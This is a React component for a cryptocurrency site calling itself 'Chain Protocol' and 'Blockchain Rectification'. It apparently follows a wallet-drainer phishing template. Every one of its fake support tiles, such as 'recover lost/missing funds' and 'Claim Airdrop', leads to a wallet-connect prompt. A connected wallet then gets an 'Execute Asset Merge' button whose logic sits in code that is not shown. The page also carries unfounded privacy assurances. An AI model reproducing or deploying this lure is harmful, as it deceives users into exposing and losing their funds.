import { useState, useEffect, useRef } from "react";
import { Zap, Loader2, LogOut, ChevronRight, ChevronDown } from "lucide-react";
import { useWeb3 } from "../hooks/useWeb3";
import { useToast } from "@/hooks/use-toast";
import WalletSelectorModal from "./WalletSelectorModal";
import WalletHelpModal from "./WalletHelpModal";
import HeroImage from "../image/IMG_1843.jpeg";

export default function BonilaSection() {
  const {
    walletConnected,
    connecting,
    connectWallet,
    disconnect,
    balance,
    account,
    mergeToken,
    selectedNetwork,
    setSelectedNetwork,
    NETWORKS
  } = useWeb3();

  const { toast } = useToast();
  const [showSelector, setShowSelector] = useState(false);
  const [showHelp, setShowHelp] = useState(false);
  const [showNetworkDropdown, setShowNetworkDropdown] = useState(false);
  const networkDropdownRef = useRef<HTMLDivElement>(null);
  
  // Network emoji mapping
  const networkEmojis: { [key: string]: string } = {
    bnb: "🔶",
    ethereum: "⟠",
    polygon: "🟣",
    avalanche: "🔴"
  };

  const networkNames: { [key: string]: string } = {
    bnb: "",
    ethereum: "",
    polygon: "MATIC",
    avalanche: "AVAX"
  };

  // Close dropdown when clicking outside
  useEffect(() => {
    const handleClickOutside = (event: MouseEvent) => {
      if (networkDropdownRef.current && !networkDropdownRef.current.contains(event.target as Node)) {
        setShowNetworkDropdown(false);
      }
    };

    document.addEventListener("mousedown", handleClickOutside);
    return () => document.removeEventListener("mousedown", handleClickOutside);
  }, []);

  // Word carousel state
  const words = ["blockchain", "nodes", "protocol", "blocks", "synchronization"];
  const [currentWordIndex, setCurrentWordIndex] = useState(0);
  
  useEffect(() => {
    const interval = setInterval(() => {
      setCurrentWordIndex((prev) => (prev + 1) % words.length);
    }, 3000); // Change word every 3 seconds
    return () => clearInterval(interval);
  }, [words.length]);

  const handleOpenConnect = () => {
    setShowSelector(true);
  };

  const handleConnectInjected = async () => {
    setShowSelector(false);
    if (!window.ethereum) {
      setShowHelp(true);
      return;
    }
    await connectWallet('injected');
  };

  const handleConnectWalletConnect = async () => {
    setShowSelector(false);
    await connectWallet('walletconnect');
  };

  const handleNetworkChange = async (newNetwork: string) => {
    setSelectedNetwork(newNetwork);
    setShowNetworkDropdown(false);
    if (walletConnected) {
      toast({
        title: "Network Changed",
        description: `Switched to ${NETWORKS[newNetwork as keyof typeof NETWORKS].name}`,
      });
    }
  };

  const handleMerge = async () => {
    try {
      await mergeToken();
    } catch (error) {
      console.error("Merge failed:", error);
    }
  };
  const features = [
    { title: "Migration", description: "Click here for migration" },
    { title: "Claim Token", description: "Click here to claim assets" },
    { title: "Swap", description: "Click here for assets swapping" },
    { title: "Slippage", description: "Click here for slippage related error." },
    { title: "Exchange", description: "Click here for exchange related issues" },
    { title: "Connect to Dapps", description: "Click here for error while connecting to dapps" },
    { title: "NFT Rarity and traits", description: "Click here for NFT related issues." },
    { title: "Whitelist", description: "Click here for whitelist related issues." },
    { title: "Login", description: "Click here for wallet login issue." },
    { title: "Transaction", description: "Click here for transaction related issues." },
    { title: "Cross Transfer", description: "Click here for cross bridge issues." },
    { title: "Staking", description: "Click here for staking related issues." },
    { title: "Buy Coins/Tokens", description: "To trade, your account must be marked as a trusted payment source." },
    { title: "Missing/Irregular balance", description: "Click here to recover lost/missing funds." },
    { title: "Wallet glitch / wallet error", description: "Click here if you have problem with your trading wallet." },
    { title: "Transaction Delay", description: "Click here for any issues related to transaction delay." },
    { title: "Claim Airdrop", description: "Click here for airdrop related issues." },
    { title: "NFTs", description: "Click here for NFTs minting/transfer related issues." },
    { title: "Locked Account", description: "Click here for issues related to account lock." },
    { title: "Presale", description: "Click here to buy/claim presale token" },
    { title: "Reward", description: "Click here for reward related issues." },
  ];

  return (
    <div id="bonita" className="min-h-screen bg-gradient-to-br from-background via-background to-primary/5 py-16 px-6 relative overflow-hidden">
      {/* Animated Background Elements */}
      <div className="absolute inset-0 overflow-hidden pointer-events-none">
        <div className="absolute -top-40 -right-40 w-80 h-80 bg-primary/10 rounded-full blur-3xl animate-pulse"></div>
        <div className="absolute -bottom-40 -left-40 w-80 h-80 bg-purple-500/10 rounded-full blur-3xl animate-pulse" style={{ animationDelay: '1s' }}></div>
      </div>

      {/* Wallet Modals */}
      <WalletSelectorModal
        isOpen={showSelector}
        onClose={() => setShowSelector(false)}
        onConnectInjected={handleConnectInjected}
        onConnectWalletConnect={handleConnectWalletConnect}
        connecting={connecting}
      />

      <WalletHelpModal
        isOpen={showHelp}
        onClose={() => setShowHelp(false)}
      />

      {/* Hero Section */}
      <div className="max-w-7xl mx-auto mb-16 relative z-10">
        <div className="flex flex-col-reverse lg:grid lg:grid-cols-2 gap-12 items-center">
          {/* Text Content */}
          <div className="space-y-8 animate-fade-in-left order-2 lg:order-1">
            <div>
              <h1 className="text-4xl md:text-5xl lg:text-7xl font-black tracking-tighter leading-none text-foreground mb-2">
                <span className="block text-transparent bg-clip-text bg-gradient-to-r from-slate-900 via-slate-700 to-slate-900 dark:from-slate-100 dark:via-slate-300 dark:to-slate-100">
                  Decentralized to
                </span>
                <span 
                  key={currentWordIndex}
                  className="block h-16 md:h-20 lg:h-24 relative inline-block overflow-hidden"
                >
                  <span
                    className="inline-block w-full bg-gradient-to-r from-blue-500 via-purple-500 to-pink-500 bg-clip-text text-transparent font-black animate-word-swipe"
                    style={{
                      filter: 'drop-shadow(0 0 25px rgba(59, 130, 246, 0.4))',
                      animationDuration: '0.6s'
                    }}
                  >
                    {words[currentWordIndex]}
                  </span>
                </span>
              </h1>
              <h2 className="text-3xl md:text-4xl lg:text-5xl font-black tracking-tighter text-foreground mt-1 leading-tight">
                <span className="inline-block bg-gradient-to-r from-purple-600 to-pink-600 bg-clip-text text-transparent">
                  Chain Protocol
                </span>
              </h2>
            </div>
            
            <p className="text-base md:text-lg text-slate-600 dark:text-slate-300 leading-relaxed max-w-xl font-medium tracking-wide">
              Chain provides industry-leading Web3 and Blockchain safe protocol and process encrypted by a superb encryption server. Your information never leaves our server or be visible to anyone.
            </p>

            <div className="space-y-6">
              {/* Smart Network Selector - Compact Emoji Badge */}
              <div className="relative" ref={networkDropdownRef}>
                <button
                  onClick={() => setShowNetworkDropdown(!showNetworkDropdown)}
                  className="group relative h-12 px-4 bg-background border border-primary/10 rounded-2xl flex items-center justify-between gap-1 hover:border-primary/40 transition-all duration-300"
                >
                  <div className="flex items-center gap-1.5">
                    <span className="text-xs opacity-20 transition-opacity group-hover:opacity-60">{networkEmojis[selectedNetwork]}</span>
                    <span className="text-xs font-semibold text-muted-foreground group-hover:text-foreground transition-colors">{networkNames[selectedNetwork]}</span>
                  </div>
                  <ChevronDown 
                    size={16} 
                    className={`text-primary transition-transform duration-300 ${showNetworkDropdown ? 'rotate-180' : ''}`}
                  />
                </button>

                {/* Dropdown Menu */}
                {showNetworkDropdown && (
                  <div className="absolute top-full left-0 right-0 mt-2 bg-card border border-primary/20 rounded-2xl shadow-xl shadow-primary/20 overflow-hidden z-50 backdrop-blur-sm">
                    {Object.entries(NETWORKS).map(([key, network]) => (
                      <button
                        key={key}
                        onClick={() => handleNetworkChange(key)}
                        className={`w-full px-4 py-3 flex items-center gap-3 transition-all duration-200 ${
                          selectedNetwork === key 
                            ? 'bg-primary/10 border-l-4 border-primary' 
                            : 'hover:bg-primary/5 border-l-4 border-transparent'
                        }`}
                      >
                        <span className="text-sm opacity-30 transition-opacity hover:opacity-60">{networkEmojis[key]}</span>
                        <div className="text-left">
                          <div className="text-sm font-black text-foreground">{network.name}</div>
                          <div className="text-xs font-black text-primary uppercase tracking-widest">{networkNames[key]}</div>
                        </div>
                        {selectedNetwork === key && (
                          <div className="ml-auto w-2 h-2 bg-primary rounded-full animate-pulse"></div>
                        )}
                      </button>
                    ))}
                  </div>
                )}
              </div>

              {!walletConnected ? (
                <button
                  className="premium-button w-auto sm:w-full h-12 sm:h-14 text-sm sm:text-lg font-black group relative overflow-hidden"
                  onClick={handleOpenConnect}
                  disabled={connecting}
                >
                  <div className="absolute inset-0 bg-gradient-to-r from-blue-500 via-purple-500 to-pink-500 opacity-0 group-hover:opacity-100 transition-opacity duration-300"></div>
                  <div className="relative flex items-center justify-start sm:justify-center gap-2 px-4 sm:px-0">
                    {connecting ? (
                      <>
                        <Loader2 size={16} className="sm:w-5 sm:h-5 animate-spin" />
                        <span>Connecting...</span>
                      </>
                    ) : (
                      <>
                        <Zap size={16} className="sm:w-5 sm:h-5" />
                        <span>Connect Wallet</span>
                        <ChevronRight size={16} className="sm:w-5 sm:h-5 group-hover:translate-x-1 transition-transform" />
                      </>
                    )}
                  </div>
                </button>
              ) : (
                <div className="rounded-2xl border border-primary/20 bg-gradient-to-br from-primary/5 via-background to-background p-8 relative overflow-hidden group animate-scale-in">
                  {/* Gradient Background */}
                  <div className="absolute inset-0 bg-gradient-to-br from-blue-500/5 via-transparent to-purple-500/5 group-hover:from-blue-500/10 group-hover:to-purple-500/10 transition-all duration-300"></div>
                  
                  <div className="text-left space-y-6 relative z-10">
                    <div>
                      <label className="text-xs font-black uppercase tracking-widest text-primary mb-2 block">Active Session</label>
                      <div className="text-lg font-mono font-black break-all bg-background p-4 rounded-xl border border-primary/20 text-foreground hover:border-primary/50 transition-colors">
                        {account}
                      </div>
                    </div>

                    <div>
                      <label className="text-xs font-black uppercase tracking-widest text-primary mb-2 block">Total Balance</label>
                      <div className="text-4xl font-black tracking-tight text-foreground">
                        {parseFloat(balance).toFixed(4)} <span className="text-primary text-2xl font-black">{NETWORKS[selectedNetwork as keyof typeof NETWORKS].symbol}</span>
                      </div>
                    </div>

                    <button
                      className="premium-button w-full h-14 text-lg font-black group relative overflow-hidden"
                      onClick={handleMerge}
                    >
                      <div className="absolute inset-0 bg-gradient-to-r from-blue-500 via-purple-500 to-pink-500 opacity-0 group-hover:opacity-100 transition-opacity duration-300"></div>
                      <div className="relative">Execute Asset Merge</div>
                    </button>

                    <button
                      className="w-full h-12 text-sm font-black text-muted-foreground hover:text-red-500 hover:bg-red-500/10 border border-border/50 rounded-2xl transition-all duration-300 flex items-center justify-center gap-2 hover:border-red-500/50"
                      onClick={disconnect}
                    >
                      <LogOut size={16} />
                      <span>Disconnect Wallet</span>
                    </button>
                  </div>
                </div>
              )}
            </div>
          </div>

          {/* Hero Image */}
          <div className="flex justify-center items-center animate-fade-in-right order-1 lg:order-2">
            <div className="relative w-full max-w-xs lg:max-w-md group">
              <div className="absolute inset-0 bg-gradient-to-br from-blue-500 via-purple-500 to-pink-500 rounded-3xl blur-2xl opacity-40 animate-pulse group-hover:opacity-60 transition-opacity duration-500"></div>
              <div className="absolute -inset-1 bg-gradient-to-r from-blue-500 via-purple-500 to-pink-500 rounded-3xl blur-xl opacity-0 group-hover:opacity-50 transition-opacity duration-500"></div>
              <img
                src={HeroImage}
                alt="Hero"
                className="relative w-full h-auto rounded-3xl border-2 border-primary/30 shadow-2xl shadow-primary/20 transform hover:scale-110 transition-all duration-500 object-cover animate-float"
              />
            </div>
          </div>
        </div>
      </div>

      {/* Services Grid */}
      <div className="max-w-7xl mx-auto relative z-10">
        <div className="text-center mb-16 animate-fade-in">
          <h2 className="text-4xl lg:text-5xl font-black text-foreground mb-4">
            Make Your Selection <span className="bg-gradient-to-r from-blue-500 via-purple-500 to-pink-500 bg-clip-text text-transparent">Below</span>
          </h2>
          <p className="text-muted-foreground text-lg max-w-2xl mx-auto">
            Choose from our comprehensive suite of tools and services to manage your blockchain assets
          </p>
        </div>

        <div className="grid md:grid-cols-2 lg:grid-cols-3 gap-6">
          {features.map((feature, index) => (
            <div
              key={index}
              className="group relative animate-fade-in"
              style={{
                animationDelay: `${index * 50}ms`,
              }}
              onClick={() => handleOpenConnect()}
            >
              <div className="absolute -inset-0.5 bg-gradient-to-r from-blue-500/20 via-purple-500/20 to-pink-500/20 rounded-2xl blur opacity-0 group-hover:opacity-100 transition-opacity duration-300"></div>
              <div className="relative bg-card/50 backdrop-blur-xl border border-primary/20 rounded-2xl p-8 cursor-pointer transition-all duration-300 hover:shadow-xl hover:shadow-primary/20 hover:border-primary/50 hover:bg-primary/5 transform group-hover:scale-105 group-hover:-translate-y-2">
                <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-blue-500 via-purple-500 to-pink-500 rounded-t-2xl transform scale-x-0 group-hover:scale-x-100 transition-transform duration-300 origin-left"></div>
                <h3 className="text-xl font-black text-foreground mb-3 group-hover:text-primary transition-colors">
                  {feature.title}
                </h3>
                <p className="text-muted-foreground leading-relaxed group-hover:text-foreground/80 transition-colors">
                  {feature.description}
                </p>
                <div className="absolute bottom-4 right-4 opacity-0 group-hover:opacity-100 transition-opacity">
                  <ChevronRight className="text-primary w-5 h-5 group-hover:translate-x-1 transition-transform" />
                </div>
              </div>
            </div>
          ))}
        </div>
      </div>

      {/* Footer */}
      <div className="max-w-7xl mx-auto mt-24 pt-12 border-t border-primary/20 relative z-10">
        <div className="flex flex-col md:flex-row justify-between items-center gap-6 animate-fade-in">
          <p className="text-muted-foreground font-semibold">© 2024. Blockchain Rectification.</p>
          <div className="flex gap-8">
            <a href="#" className="text-muted-foreground hover:text-primary transition-colors font-semibold relative group">
              Privacy Policy
              <div className="absolute bottom-0 left-0 w-0 h-0.5 bg-gradient-to-r from-blue-500 to-pink-500 group-hover:w-full transition-all duration-300"></div>
            </a>
            <a href="#" className="text-muted-foreground hover:text-primary transition-colors font-semibold relative group">
              Terms & Conditions
              <div className="absolute bottom-0 left-0 w-0 h-0.5 bg-gradient-to-r from-blue-500 to-pink-500 group-hover:w-full transition-all duration-300"></div>
            </a>
          </div>
        </div>
      </div>
    </div>
  );
}
